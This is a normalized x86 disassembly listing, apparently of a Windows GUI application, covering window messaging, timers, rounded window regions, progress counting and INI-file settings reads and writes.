mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jb r-xdata
call sub_4407b7
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jb r-xdata
call sub_4407b7
mov ecx [ esi + 0x17c ]
xor eax eax
mov [ ecx + ebp + 0x70 ] 0x0
mov [ esp + 0xc ] eax
call sub_4407b7
mov edx [ esi + 0x17c ]
xor ebx ebx
mov [ edx + ebp + 0x70 ] 0x1
mov [ esp + 0x14 ] ebx
nop
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ edi + 0xc ]
inc [ esp + 0xc ]
mov [ eax + ecx + 0x70 ] 0x0
add eax 0xc0
jmp r-xdata
call sub_4407b7
mov ecx [ edi + 0xc ]
mov edx [ esp + 0x14 ]
cmp [ edx + ecx + 0x70 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jae r-xdata
call sub_4407b7
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jae r-xdata
call sub_4407b7
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jb r-xdata
call sub_4407b7
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jb r-xdata
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov [ esp + 0x14 ] eax
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
inc [ esp + 0xc ]
add [ esp + 0x14 ] 0xc0
jmp r-xdata
inc [ esi + 0xe34 ]
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ esp + 0x10 ] ecx
jb r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ edi + 0xc ]
inc [ esp + 0xc ]
mov [ eax + ecx + 0x70 ] 0x0
add eax 0xc0
jmp r-xdata
call sub_4407b7
mov ecx [ edi + 0xc ]
mov eax [ esp + 0x14 ]
mov [ eax + ecx + 0x70 ] 0x1
mov ecx 0x1
add [ esi + 0xe34 ] ecx
add [ esp + 0xc ] ecx
add eax 0xc0
jmp r-xdata
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jb r-xdata
call sub_4407b7
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov [ esp + 0x14 ] eax
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov [ esp + 0x14 ] eax
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ edi + 0xc ]
inc [ esp + 0xc ]
mov [ ecx + eax + 0x70 ] 0x0
add eax 0xc0
jmp r-xdata
call sub_4407b7
mov eax [ esp + 0x14 ]
mov ecx [ edi + 0xc ]
mov [ eax + ecx + 0x70 ] 0x1
inc [ esi + 0xe34 ]
inc ebx
add eax 0xc0
mov [ esp + 0x14 ] eax
jmp r-xdata
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov [ esp + 0x14 ] eax
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0x10 ] eax
jb r-xdata
sub_4088f0
push 0xffffffff
push sub_45ab48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x14 ] ax
push 0x32
mov eax r--data
lea esi [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] 0x0
call sub_429cc0
push 0x7
mov eax r--data
mov ecx esi
mov [ esp + 0x3c ] 0x0
call sub_429170
mov edi esi
call sub_41f1a0
mov ecx [ esp + 0x14 ]
mov esi 0x8
cmp [ esp + 0x28 ] esi
jae r-xdata
mov eax [ ebx + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
mov ecx [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x10
push ecx
call [ PostMessageW@IAT ]
cmp [ esp + 0x28 ] esi
jb r-xdata
push ecx
call eax
mov eax 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov edx [ esp + 0x14 ]
push edx
call sub_43f960
add esp 0x4
sub_4089f0
push 0xffffffff
push sub_45b5eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x314
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30c ] eax
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x324 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x334 ]
cmp [ ebp + 0xe49 ] 0x0
je r-xdata
cmp [ ebp + 0xe48 ] 0x0
je r-xdata
xor eax eax
mov [ esp + 0x304 ] ax
push 0x32
mov eax r--data
lea esi [ esp + 0x304 ]
mov [ esp + 0x31c ] 0x7
mov [ esp + 0x318 ] 0x0
call sub_429cc0
push 0x7
mov eax r--data
mov ecx esi
mov [ esp + 0x330 ] 0x0
call sub_429170
mov edi esi
call sub_41f1a0
mov ecx [ esp + 0x304 ]
mov esi 0x8
cmp [ esp + 0x318 ] esi
jae r-xdata
xor eax eax
mov [ esp + 0x2e8 ] ax
push 0x32
mov eax r--data
lea esi [ esp + 0x2e8 ]
mov [ esp + 0x300 ] 0x7
mov [ esp + 0x2fc ] 0x0
call sub_429cc0
push 0x9
mov eax r--data
mov ecx esi
mov [ esp + 0x330 ] 0x1
call sub_429170
mov edi esi
call sub_41f1a0
cmp [ esp + 0x2fc ] 0x8
mov ecx [ esp + 0x2e8 ]
jae r-xdata
mov edx [ ebp + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
jmp r-xdata
mov eax [ ebp + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x304 ]
mov eax [ ebp + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x2e8 ]
mov eax 0x1
mov ecx [ esp + 0x324 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x30c ]
xor ecx esp
call sub_43f96b
add esp 0x320
retn 0x4
mov [ esp + 0x32c ] 0xffffffff
cmp [ esp + 0x318 ] esi
jb r-xdata
push ecx
call eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_41ec20
mov [ esp + 0x32c ] 0x2
call [ GetActiveWindow@IAT ]
push eax
lea edi [ esp + 0x18 ]
call sub_40ec00
cmp eax 0x1
jne r-xdata
push ecx
call eax
mov ecx [ esp + 0x304 ]
push ecx
call sub_43f960
add esp 0x4
lea esi [ esp + 0x14 ]
mov [ esp + 0x32c ] 0x1
call sub_41dd90
cmp [ esp + 0x2fc ] 0x8
jb r-xdata
mov edx [ ebp + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
mov eax [ esp + 0x2e8 ]
push eax
call sub_43f960
add esp 0x4
sub_408c10
push 0xffffffff
push sub_45b593
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2fc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2f4 ] eax
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x31c ]
xor eax eax
mov [ esp + 0x2ec ] ax
push 0x32
mov eax r--data
lea esi [ esp + 0x2ec ]
mov [ esp + 0x304 ] 0x7
mov [ esp + 0x300 ] 0x0
call sub_429cc0
push 0x9
mov eax r--data
mov ecx esi
mov [ esp + 0x318 ] 0x0
call sub_429170
mov edi esi
call sub_41f1a0
cmp [ esp + 0x300 ] 0x8
mov ecx [ esp + 0x2ec ]
jae r-xdata
mov eax [ ebp + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x2ec ]
lea ecx [ esp + 0x14 ]
push ecx
call sub_41ec20
mov [ esp + 0x314 ] 0x1
call [ GetActiveWindow@IAT ]
push eax
lea edi [ esp + 0x18 ]
call sub_40ec00
cmp eax 0x1
jne r-xdata
push ecx
call eax
lea esi [ esp + 0x14 ]
mov [ esp + 0x314 ] 0x0
call sub_41dd90
cmp [ esp + 0x300 ] 0x8
jb r-xdata
mov edx [ ebp + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
mov eax 0x1
mov ecx [ esp + 0x30c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x2f4 ]
xor ecx esp
call sub_43f96b
add esp 0x308
retn 0x4
mov eax [ esp + 0x2ec ]
push eax
call sub_43f960
add esp 0x4
sub_408d60
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ ecx - 0x20 ]
sub esp 0x10
lea eax [ esp ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ esp ]
push 0x0
sub edx eax
push edx
mov edx [ esp + 0x10 ]
sub edx ecx
push edx
push eax
mov eax [ ebp + 0x8 ]
push ecx
push eax
mov ecx rw-data
call sub_420ee0
mov esp ebp
pop ebp
retn 0x8
sub_408db0
sub esp 0x20
push ebx
push ebp
push esi
push edi
movzx esi ax
push 0x7
shr eax 0x10
push 0x7
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea ecx [ esi + 0x1 ]
push ecx
push 0x0
push 0x0
call [ CreateRoundRectRgn@IAT ]
mov ebp [ CreateRectRgn@IAT ]
mov ecx 0x1
mov ebx eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] ecx
lea eax [ esi - 0x2 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
lea ecx [ edi - 0x2 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ecx
xor edi edi
lea ebx [ ebx ]
inc edi
cmp edi 0x4
jl r-xdata
push esi
call [ DeleteObject@IAT ]
mov eax [ esp + edi * 8 + 0x14 ]
mov ecx [ esp + edi * 8 + 0x10 ]
lea edx [ eax + 0x1 ]
push edx
lea edx [ ecx + 0x1 ]
push edx
push eax
push ecx
call ebp
push 0x4
mov esi eax
push esi
push ebx
push ebx
call [ CombineRgn@IAT ]
test esi esi
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x4 ]
push 0x1
push ebx
push ecx
call [ SetWindowRgn@IAT ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x20
retn 0x4
push ebx
call [ DeleteObject@IAT ]
sub_408e70
push ecx
inc [ eax + 0xe38 ]
mov ecx [ eax + 0xe38 ]
mov [ esp ] ecx
fild [ esp ]
push esi
lea esi [ eax + 0x5b4 ]
fidiv [ eax + 0xe34 ]
fmul [ r--data ]
call sub_4567a0
mov ecx [ esi + 0x1c ]
mov [ esi + 0x28 ] eax
test ecx ecx
je r-xdata
mov eax 0x1
pop esi
pop ecx
retn
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x0
push 0x0
push esi
call eax
sub_408ec0
push 0xffffffff
push sub_45a780
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x3c ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] ax
lea edi [ esp + 0xc ]
mov [ esp + 0x34 ] eax
call sub_41dbe0
mov ecx [ esp + 0x10 ]
mov edi 0x8
cmp [ esp + 0x24 ] edi
jae r-xdata
mov eax 0x1
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn 0x4
xor edx edx
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] dx
lea edi [ esp + 0xc ]
mov [ esp + 0x34 ] eax
call sub_41d800
mov ecx [ esp + 0x10 ]
mov edi 0x8
cmp [ esp + 0x24 ] edi
jae r-xdata
mov eax [ ebx + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
mov eax [ ebx + 0xe88 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
cmp [ esp + 0x24 ] edi
jb r-xdata
push ecx
call eax
cmp [ esp + 0x24 ] edi
jb r-xdata
push ecx
call eax
mov ecx [ esp + 0x10 ]
push ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_43f960
add esp 0x4
sub_408fd0
push 0xffffffff
push sub_45b55b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2d4
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2e0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0xe48 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
call sub_41ec20
mov [ esp + 0x2e8 ] 0x0
call [ GetActiveWindow@IAT ]
push eax
lea edi [ esp + 0x10 ]
call sub_40ec00
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
push 0x10
push eax
call [ PostMessageW@IAT ]
jmp r-xdata
lea esi [ esp + 0xc ]
mov [ esp + 0x2e8 ] 0xffffffff
call sub_41dd90
mov edx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ PostMessageW@IAT ]
mov eax 0x1
mov ecx [ esp + 0x2e0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x2e0
retn
sub_409090
push 0xffffffff
push sub_45af90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x5c ]
mov ecx [ ebp + 0x5d0 ]
lea eax [ ebp + 0x5b4 ]
xor esi esi
mov [ eax + 0x28 ] 0x32
cmp ecx esi
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call sub_40f4f0
mov [ esp + 0x54 ] esi
mov [ esp + 0x40 ] esi
xor edx edx
push 0x5
mov eax r--data
lea esi [ esp + 0x30 ]
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x34 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x1
call sub_428670
xor ebx ebx
mov edi 0x8
mov [ esp + 0x54 ] bl
cmp [ esp + 0x44 ] edi
jb r-xdata
mov edx [ ecx ]
push esi
push esi
push esi
push eax
mov eax [ edx + 0x28 ]
call eax
xor edx edx
push 0x6
mov eax r--data
lea esi [ esp + 0x30 ]
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x2
call sub_428670
xor ebx ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x44 ] edi
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_43f960
add esp 0x4
xor edx edx
push 0x7
mov eax r--data
lea esi [ esp + 0x30 ]
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] dx
call sub_429cc0
mov eax esi
push eax
lea ebx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x3
call sub_428670
xor ebx ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x44 ] edi
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_43f960
add esp 0x4
lea eax [ ebp + 0x544 ]
lea edi [ esp + 0x14 ]
call sub_41d750
mov edx [ ebp + 0x4 ]
mov esi [ SetTimer@IAT ]
push ebx
push 0xc8
push 0x385
push edx
call esi
mov eax [ ebp + 0x4 ]
push ebx
push 0x7d0
push 0x387
push eax
call esi
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x14 ]
push eax
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
call sub_43f960
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x4c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn 0x4
mov ecx [ esp + 0x5c ]
mov edi [ esp + 0x24 ]
push ecx
call sub_429630
mov edx [ esp + 0x24 ]
add esp 0x4
push edx
call sub_43f960
add esp 0x4
sub_409270
push ecx
push esi
cmp eax 0x3039
jne r-xdata
cmp eax 0x303a
jne r-xdata
lea esi [ ecx + 0x5b4 ]
call sub_41d5a0
mov eax 0x1
pop esi
pop ecx
retn 0x4
mov eax [ esp + 0xc ]
mov [ eax ] 0x0
xor eax eax
pop esi
pop ecx
retn 0x4
lea esi [ ecx + 0x544 ]
call sub_41d4f0
mov eax 0x1
pop esi
pop ecx
retn 0x4
sub_4092c0
push 0xffffffff
push sub_45b2e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x154 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x164 ]
mov [ ebp + 0xe40 ] 0xcc
mov al [ ebp + 0xe40 ]
push ebp
mov [ ebp + 0xe3c ] 0x1
call sub_406e50
call [ GetTickCount@IAT ]
xor esi esi
push esi
push 0x64
mov [ ebp + 0xe44 ] eax
mov eax [ ebp + 0x4 ]
push 0x386
push eax
call [ SetTimer@IAT ]
mov ecx [ ebp + 0x4 ]
push 0x385
push ecx
call [ KillTimer@IAT ]
push ebp
mov [ ebp + 0x188 ] 0x2
call sub_40b260
mov [ ebp + 0xe48 ] 0x1
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] esi
je r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xc4 ] esi
mov [ esp + 0xb4 ] cx
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edx
push eax
push r--data
lea ecx [ esp + 0xbc ]
mov [ esp + 0x168 ] esi
call sub_41f480
lea ecx [ esp + 0xbc ]
add esp 0xc
push ecx
mov edi r--data
call sub_41f340
mov [ esp + 0xb0 ] ebx
xor ebx ebx
xor edx edx
add esp 0x4
mov [ esp + 0xa8 ] ebx
mov [ esp + 0x98 ] dx
mov eax [ esp + 0x20 ]
push eax
push r--data
lea ecx [ esp + 0x9c ]
mov [ esp + 0x164 ] 0x1
call sub_41f480
lea ecx [ esp + 0x9c ]
push ecx
mov edi r--data
call sub_41f340
add esp 0xc
cmp [ esp + 0x18 ] ebx
jl r-xdata
xor ebx ebx
mov edi 0x8
lea esi [ edi - 0x1 ]
jg r-xdata
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov edx [ ebp + 0x4 ]
push 0x388
push edx
call [ KillTimer@IAT ]
cmp [ ebp + 0xe8c ] 0x0
je r-xdata
xor ecx ecx
mov [ esp + 0x58 ] esi
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] cx
lea edx [ esp + 0x40 ]
push edx
mov ecx r--data
mov [ esp + 0x160 ] 0x6
call sub_41d380
add esp 0x4
push ebx
call sub_440ccf
xor ecx ecx
add esp 0x4
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] cx
push edx
push eax
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x168 ] 0x7
call sub_41f480
mov ecx [ esp + 0x50 ]
add esp 0xc
cmp [ esp + 0x58 ] edi
jae r-xdata
mov esi 0x7
xor edx edx
mov [ esp + 0x90 ] esi
mov [ esp + 0x8c ] ebx
mov [ esp + 0x7c ] dx
lea eax [ esp + 0x78 ]
push eax
mov ecx r--data
mov [ esp + 0x160 ] 0x2
call sub_41d380
add esp 0x4
push ebx
call sub_440ccf
xor ecx ecx
add esp 0x4
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] cx
push edx
push eax
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x168 ] 0x3
call sub_41f480
mov ecx [ esp + 0x88 ]
mov edi 0x8
add esp 0xc
cmp [ esp + 0x90 ] edi
jae r-xdata
cmp [ esp + 0x14 ] ebx
jbe r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
cmp [ ebp + 0xe8d ] 0x0
je r-xdata
mov eax [ ebp + 0x4 ]
push ebx
push 0x2710
push 0x389
push eax
jmp r-xdata
mov eax [ esp + 0x28 ]
cmp [ esp + 0x3c ] edi
jae r-xdata
lea ecx [ esp + 0x44 ]
mov eax [ esp + 0x28 ]
cmp [ esp + 0x3c ] edi
jae r-xdata
lea ecx [ esp + 0x7c ]
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
call sub_4298e0
test eax eax
je r-xdata
call sub_4407b7
mov eax [ ebp + 0x17c ]
mov ecx [ ebx + eax + 0x98 ]
add [ esp + 0x14 ] ecx
mov edx [ ebx + eax + 0x9c ]
adc [ esp + 0x18 ] edx
call sub_4407b7
mov edx [ ebp + 0x4 ]
push ebx
push 0x3e8
push 0x38b
push edx
call [ SetTimer@IAT ]
cmp [ esp + 0xac ] edi
jb r-xdata
mov eax [ ebp + 0xe90 ]
cmp eax ebx
jle r-xdata
call [ SetTimer@IAT ]
push ecx
push eax
push r--data
push r--data
call [ WritePrivateProfileStringW@IAT ]
cmp [ esp + 0x3c ] edi
jb r-xdata
lea eax [ esp + 0x28 ]
mov esi [ WritePrivateProfileStringW@IAT ]
push ecx
push eax
push r--data
push r--data
call esi
xor edx edx
mov [ esp + 0x58 ] 0x7
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] dx
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
push r--data
lea ecx [ esp + 0x4c ]
mov [ esp + 0x168 ] 0x4
call sub_41f480
mov ecx [ esp + 0x88 ]
add esp 0xc
cmp [ esp + 0x90 ] edi
jae r-xdata
lea eax [ esp + 0x28 ]
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc esi
add eax edx
add ebx 0xd8
cmp esi eax
jb r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp esi ecx
jb r-xdata
xor ecx ecx
mov [ esp + 0xac ] esi
mov [ esp + 0xa8 ] ebx
mov [ esp + 0x98 ] cx
cmp [ esp + 0xc8 ] edi
jb r-xdata
mov eax [ esp + 0x98 ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ ebp + 0x4 ]
push ebx
push eax
push 0x38a
push ecx
xor eax eax
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] ax
cmp [ esp + 0x58 ] edi
jb r-xdata
mov edx [ esp + 0x28 ]
push edx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x44 ]
cmp [ esp + 0x58 ] edi
jae r-xdata
lea ecx [ esp + 0x7c ]
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp esi ecx
jb r-xdata
xor esi esi
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
call sub_4298e0
test eax eax
je r-xdata
call sub_4407b7
mov eax 0x1
mov ecx [ esp + 0x154 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_43f96b
add esp 0x14c
retn 0x4
mov edx [ esp + 0xb4 ]
push edx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x44 ]
push ecx
call sub_43f960
add esp 0x4
push ecx
push eax
push r--data
push r--data
call esi
xor edx edx
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] dx
push 0x7e
lea ecx [ esp + 0xd2 ]
xor eax eax
push ebx
mov [ esp + 0x164 ] 0x5
push ecx
mov [ esp + 0xd8 ] ax
call sub_443360
mov eax [ esp + 0x88 ]
add esp 0xc
cmp [ esp + 0x90 ] edi
jae r-xdata
lea eax [ esp + 0x44 ]
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
push eax
push 0x40
lea edx [ esp + 0xd4 ]
push edx
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
lea eax [ esp + 0xcc ]
lea edx [ eax + 0x2 ]
lea eax [ esp + 0x7c ]
mov ecx [ ebp + 0x17c ]
